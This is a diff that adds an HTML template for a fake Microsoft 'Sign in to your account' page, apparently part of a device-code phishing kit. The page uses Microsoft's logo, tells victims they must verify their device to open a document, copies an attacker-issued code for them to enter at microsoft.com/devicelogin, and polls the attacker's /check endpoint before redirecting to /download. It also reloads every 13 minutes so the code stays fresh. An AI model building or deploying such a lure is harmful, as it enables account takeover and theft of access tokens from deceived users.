@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" type="image/png">
+    <title>Sign in to your account</title>
+    <style>
+        body {
+            font-family: "Segoe UI", Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f8e6e6 0%, #e6f0e9 100%);
+        }
+        
+        .card {
+            background-color: white;
+            width: 440px;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            border-radius: 2px;
+        }
+        
+        .logo {
+            margin-bottom: 16px;
+        }
+        
+        .logo-image {
+            width: 108px;
+            height: 24px;
+        }
+
+        .usercode-box {
+            display: inline-block;
+            background-color: #e1e1e1;
+            padding: 10px 30px;
+            font-size: 20px;
+            font-weight: bold;
+            margin: 10 0;
+            border-radius: 6px;
+        }
+
+        .action {
+            font-size: 14px;
+            color: #605e5c;
+            margin-top: 20px;
+        }
+
+        .spinner-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 30px;
+            font-size: 14px;
+            color: #323130;
+        }
+
+        .spinner {
+            border: 4px solid #e1e1e1;
+            border-top: 4px solid #0078d4;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+                
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            color: #1b1b1b;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img class="logo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo">
+        <div class="title" style="font-weight: bold; font-size: 22px;">
+            You need to verify your device to access this document.
+        </div>
+        <p>To continue, use the following code at <a href="https://microsoft.com/devicelogin" target="_blank">microsoft.com/devicelogin</a> or click the code to copy it to your clipboard.</p>
+        <div id="usercode" class="usercode-box" onclick="copyAndRedirect()" title="Click to copy">
+            {{.UserCode}}
+        </div>
+        <div class="action">
+            You'll be redirected to your document after authentication.
+        </div>
+        <div id="spinner-box" class="spinner-container">
+            <div class="spinner"></div>
+            <div>Verifying your account...TESTING</div>
+        </div>
+    </div>
+
+    <script>
+
+    // Refresh the page every 13 minutes (13 * 60 * 1000 milliseconds)
+    setInterval(() => {
+        location.reload();
+    }, 13 * 60 * 1000);
+
+    function showSpinner() {
+        document.getElementById("spinner-box").style.display = "flex";
+    }
+
+    function copyAndRedirect() {
+        const codeBox = document.getElementById("usercode");
+        const code = codeBox.innerText;
+
+        // Copy to clipboard
+        const temp = document.createElement("input");
+        temp.value = code;
+        document.body.appendChild(temp);
+        temp.select();
+        document.execCommand("copy");
+        document.body.removeChild(temp);
+
+          // Show "Copied!" temporarily
+        codeBox.innerText = "Copied!";
+        setTimeout(() => {
+            codeBox.innerText = code;
+
+            // Open Microsoft login page
+            window.open("https://microsoft.com/devicelogin", "_blank");
+
+            // Show spinner and start polling
+            document.getElementById("spinner-box").style.display = "flex";
+            checkToken();
+
+        }, 600); // wait 1 second
+    }
+
+    function checkToken() {
+        fetch("/check").then(res => {
+            if (res.status === 200) {
+                showSpinner();
+                setTimeout(() => {
+                    window.location.href = "/download";
+                }, 2000);
+            } else {
+                setTimeout(checkToken, 3000);
+            }
+        });
+    }
+    </script>
+</body>
+</html>
